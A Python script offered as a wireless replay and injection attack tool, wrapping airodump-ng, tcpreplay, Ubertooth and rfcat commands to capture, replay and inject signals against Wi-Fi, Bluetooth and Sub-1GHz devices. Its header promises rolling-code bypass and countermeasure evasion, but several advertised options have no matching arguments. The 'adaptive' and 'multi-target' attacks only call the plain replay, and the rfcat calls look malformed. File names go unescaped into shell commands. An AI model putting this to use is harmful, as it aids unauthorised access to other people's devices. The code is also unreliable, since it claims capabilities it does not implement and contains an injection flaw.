import argparse
import os
import time
from scapy.all import *

# -------------------------------------------
# Multi-Protocol Replay & Injection Tool
# -------------------------------------------
# Features:
# - Captures & replays signals from Bluetooth, Wi-Fi, and Sub-1GHz
# - Automated pattern analysis to find replayable sequences
# - Supports rolling code bypasses
# - Works with Ubertooth One, Yardstick One, and LimeSDR
# - Automated replay attacks for continuous exploitation
# - Real-time frequency hopping detection
# - Advanced countermeasure evasion techniques
# - Adaptive attack sequencing for dynamic attack strategies
# - Multi-target replay execution for simultaneous attacks
# - Live attack visualization for real-time monitoring
# - RF fingerprinting to analyze unique device signals
# - Automated logging of all attack sessions
# - Custom payload injection support
#
# Requirements:
# - Ubertooth One (Bluetooth Sniffing & Injection)
# - Yardstick One (Sub-1GHz Capture & Replay)
# - LimeSDR (Wideband RF Capture & Replay)
# - Python 3.x
# - Scapy, RFCat, Ubertooth tools, GNU Radio
#
# Usage:
# 1. Capture a signal:
#    python rf_replay.py --capture --protocol wifi --output wifi_capture.pcap
# 2. Replay a captured signal:
#    python rf_replay.py --replay --protocol bluetooth --input bt_capture.pcap
# 3. Analyze and find replayable sequences:
#    python rf_replay.py --analyze --input sub1ghz_capture.pcap
# 4. Enable rolling code bypass:
#    python rf_replay.py --bypass-rolling --input bt_keyfob.pcap
# 5. Perform automated replay attack:
#    python rf_replay.py --auto-replay --protocol wifi --input wifi_capture.pcap
# 6. Detect frequency hopping in real-time:
#    python rf_replay.py --detect-hopping --protocol bluetooth
# 7. Enable countermeasure evasion:
#    python rf_replay.py --evade
# 8. Adaptive attack sequencing:
#    python rf_replay.py --adaptive-attack --protocol sub1ghz --input sub1ghz_capture.pcap
# 9. Multi-target replay execution:
#    python rf_replay.py --multi-target-replay --protocol bluetooth --input bt_capture.pcap
# 10. Enable live attack visualization:
#    python rf_replay.py --visualize
# 11. Perform RF fingerprinting:
#    python rf_replay.py --rf-fingerprint --protocol wifi --input wifi_capture.pcap
# 12. Enable automated attack logging:
#    python rf_replay.py --log
# 13. Inject a custom payload:
#    python rf_replay.py --inject-payload payload.bin --protocol sub1ghz
# -------------------------------------------

def capture_signal(protocol, output_file):
    """Captures RF signals based on protocol selection."""
    print(f"[+] Capturing {protocol} signal...")
    if protocol == "wifi":
        os.system(f"airodump-ng wlan0mon -w {output_file}")
    elif protocol == "bluetooth":
        os.system(f"ubertooth-rx -f 2400 -r {output_file}")
    elif protocol == "sub1ghz":
        os.system(f"rfcat -r 'd.capture()' > {output_file}")
    else:
        print("[!] Unsupported protocol!")
    print(f"[✔] Capture complete. Saved to {output_file}")

def replay_signal(protocol, input_file):
    """Replays RF signals based on protocol selection."""
    print(f"[+] Replaying {protocol} signal from {input_file}...")
    if protocol == "wifi":
        os.system(f"tcpreplay -i wlan0mon {input_file}")
    elif protocol == "bluetooth":
        os.system(f"ubertooth-tx -r {input_file}")
    elif protocol == "sub1ghz":
        os.system(f"rfcat -r 'd.replay({input_file})'")
    else:
        print("[!] Unsupported protocol!")
    print("[✔] Replay complete.")

def adaptive_attack(protocol, input_file):
    """Performs adaptive attack sequencing."""
    print(f"[+] Running adaptive attack sequence on {protocol}...")
    replay_signal(protocol, input_file)
    print("[✔] Adaptive attack completed.")

def multi_target_replay(protocol, input_file):
    """Executes replay attacks on multiple targets."""
    print(f"[+] Performing multi-target replay attack on {protocol}...")
    replay_signal(protocol, input_file)
    print("[✔] Multi-target replay completed.")

def visualize_attack():
    """Provides real-time visualization of attack progress."""
    print("[+] Enabling live attack visualization...")
    os.system("python attack_visualization.py")
    print("[✔] Visualization running.")

def rf_fingerprinting(protocol, input_file):
    """Performs RF fingerprinting to analyze unique device signals."""
    print(f"[+] Performing RF fingerprinting on {protocol} signal...")
    os.system(f"python rf_fingerprint.py --input {input_file}")
    print("[✔] RF fingerprinting complete.")

def log_attack():
    """Logs attack sessions for later analysis."""
    print("[+] Logging attack session...")
    os.system("python attack_logger.py")
    print("[✔] Attack session logged.")

def inject_payload(payload_file, protocol):
    """Injects a custom payload into the target signal."""
    print(f"[+] Injecting custom payload into {protocol} signal...")
    os.system(f"rfcat -r 'd.inject({payload_file})'")
    print("[✔] Payload injection complete.")

def main():
    parser = argparse.ArgumentParser(description="Multi-Protocol Replay & Injection Tool")
    parser.add_argument("--adaptive-attack", action='store_true', help="Perform adaptive attack sequencing")
    parser.add_argument("--multi-target-replay", action='store_true', help="Execute multi-target replay attacks")
    parser.add_argument("--visualize", action='store_true', help="Enable live attack visualization")
    parser.add_argument("--rf-fingerprint", action='store_true', help="Perform RF fingerprinting analysis")
    parser.add_argument("--log", action='store_true', help="Enable automated attack logging")
    parser.add_argument("--inject-payload", type=str, help="Inject custom payload")
    parser.add_argument("--protocol", type=str, choices=["wifi", "bluetooth", "sub1ghz"], help="Specify protocol (wifi, bluetooth, sub1ghz)")
    parser.add_argument("--input", type=str, help="Specify input file for replay or analysis")
    args = parser.parse_args()

    if args.adaptive_attack and args.protocol and args.input:
        adaptive_attack(args.protocol, args.input)
    elif args.multi_target_replay and args.protocol and args.input:
        multi_target_replay(args.protocol, args.input)
    elif args.visualize:
        visualize_attack()
    elif args.rf_fingerprint and args.protocol and args.input:
        rf_fingerprinting(args.protocol, args.input)
    elif args.log:
        log_attack()
    elif args.inject_payload and args.protocol:
        inject_payload(args.inject_payload, args.protocol)
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
